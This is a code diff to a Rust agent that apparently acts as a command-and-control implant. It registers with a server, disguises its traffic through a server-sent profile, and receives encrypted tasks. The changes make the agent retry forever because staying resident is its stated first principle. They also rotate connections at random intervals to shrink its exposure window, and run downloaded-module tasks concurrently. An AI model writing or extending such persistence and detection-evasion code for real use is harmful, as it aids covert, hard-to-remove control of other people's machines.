@@ -1,4 +1,5 @@
 use serde_json::Value;
+use rand::Rng;
 
 use libra_crypto::AgentCrypto;
 use libra_comm::http::HttpCommunicator;
@@ -19,9 +20,6 @@ pub struct AgentEngine {
     session_token: String,
     /// 流量伪装 profile（单入口/壳字段/UA/padding），注册响应下发。
     profile: Option<libra_common::models::ProfileTransform>,
-    /// Profile paths adopted at registration (empty = use build-time paths).
-    heartbeat_path: String,
-    result_path: String,
 }
 
 impl AgentEngine {
@@ -33,8 +31,6 @@ impl AgentEngine {
             agent_id: String::new(),
             session_token: String::new(),
             profile: None,
-            heartbeat_path: String::new(),
-            result_path: String::new(),
         }
     }
 
@@ -43,12 +39,16 @@ impl AgentEngine {
     // ── Main entry point ─────────────────────────────────────────────
 
     pub async fn run(&mut self) -> Result<(), String> {
+        // 注册/会话失败统一重试（指数退避 5s→10s→…→300s 封顶）：
+        // SESSION_LOST = 快速重注册（服务端密钥轮换/重启）；其他错误
+        // （服务端不可达/公钥失配 401 等）也绝不退出——agent 常驻是第一原则。
+        let mut backoff_secs: u64 = 5;
         loop {
             match self.run_once().await {
                 // 会话丢失（服务端重启/重启后 token 失效）：重置通道状态，
                 // 重新走注册流程（新 token + 可能的新会话密钥）。crypto 的
-                // RSA keypair 与已有 session key 保留——服务端若仍持有旧
-                // session key 则复用（hasSessionKey=true），否则重新下发。
+                // RSA keypair 保留——服务端若仍持有旧 session key 则复用，
+                // 否则重新下发（清 session key 强制协商）。
                 Err(e) if e == "SESSION_LOST" => {
                     libra_common::dlog!("[INFO] session lost — re-registering");
                     self.http = None;
@@ -57,9 +57,19 @@ impl AgentEngine {
                     // 强制协商新会话密钥：服务端重启后其内存/Mongo 中的 key
                     // 可能与 agent 持有的失配，保留旧 key 会死循环。
                     self.crypto.clear_session_key();
+                    backoff_secs = 5;
                     continue;
                 }
-                other => return other,
+                Err(e) => {
+                    libra_common::dlog!("[WARN] agent error: {e} — retrying in {backoff_secs}s");
+                    self.http = None;
+                    self.session_token.clear();
+                    self.profile = None;
+                    tokio::time::sleep(std::time::Duration::from_secs(backoff_secs)).await;
+                    backoff_secs = (backoff_secs * 2).min(300);
+                    continue;
+                }
+                Ok(()) => return Ok(()),
             }
         }
     }
@@ -184,6 +194,7 @@ impl AgentEngine {
             if let Some(p) = hb_profile {
                 hb_http.set_profile(p);
             }
+            let hb_http = std::sync::Arc::new(hb_http);
             loop {
                 match heartbeat_tick(&hb_http, &hb_agent_id, hb_key.as_ref(), &hb_mm).await {
                     Ok(()) => {}
@@ -221,19 +232,35 @@ impl AgentEngine {
             if let Some(p) = sse_profile {
                 sse_http.set_profile(p);
             }
+            let sse_http = std::sync::Arc::new(sse_http);
             loop {
                 match sse_http.open_events(sse_key.as_ref().unwrap_or(&[0u8; 32])).await {
                     Ok(resp) => {
                         let mut stream = resp.bytes_stream();
                         let mut buf: Vec<u8> = Vec::with_capacity(4096);
+                        // 有界连接生命周期（5-15 分钟随机）：长连接有固定暴露窗口，
+                        // 主动轮换更接近"短会话"业务行为，也避免连接泄漏累积。
+                        let lifetime = std::time::Duration::from_secs(
+                            rand::thread_rng().gen_range(300..=900));
+                        let start = std::time::Instant::now();
                         loop {
-                            match stream.next().await {
-                                Some(Ok(chunk)) => buf.extend_from_slice(&chunk),
-                                Some(Err(e)) => {
+                            let remaining = lifetime.saturating_sub(start.elapsed());
+                            if remaining.is_zero() {
+                                libra_common::dlog!("[sse] session lifetime reached — rotating");
+                                break;
+                            }
+                            match tokio::time::timeout(remaining, stream.next()).await {
+                                Ok(Some(Ok(chunk))) => buf.extend_from_slice(&chunk),
+                                Ok(Some(Err(e))) => {
                                     libra_common::dlog!("[sse] read error: {e}");
                                     break;
                                 }
-                                None => break,
+                                Ok(None) => break,
+                                Err(_) => {
+                                    // lifetime 到期：主动轮换连接
+                                    libra_common::dlog!("[sse] session lifetime reached — rotating");
+                                    break;
+                                }
                             }
                             // 按行解析（chunk 可能跨行/多行）
                             while let Some(pos) = buf.iter().position(|&b| b == b'\n') {
@@ -250,7 +277,15 @@ impl AgentEngine {
                                             if let Ok(v) = serde_json::from_str::<Value>(&plain) {
                                                 if v["op"].as_str() == Some("task") {
                                                     match serde_json::from_value::<libra_common::models::AgentTask>(v["data"].clone()) {
-                                                        Ok(task) => handle_task(&sse_http, &task, &sse_agent_id, sse_key.as_ref(), &sse_mm).await,
+                                                        Ok(task) => {
+                                                            // 并发执行：长任务（模块下载/执行）不阻塞后续任务。
+                                                            let h = sse_http.clone();
+                                                            let mm2 = sse_mm.clone();
+                                                            let aid = sse_agent_id.clone();
+                                                            tokio::spawn(async move {
+                                                                handle_task(&h, &task, &aid, sse_key.as_ref(), &mm2).await;
+                                                            });
+                                                        }
                                                         Err(e) => libra_common::dlog!("[sse] task parse failed: {e} | raw={}", v["data"].to_string()),
                                                     }
                                                 }
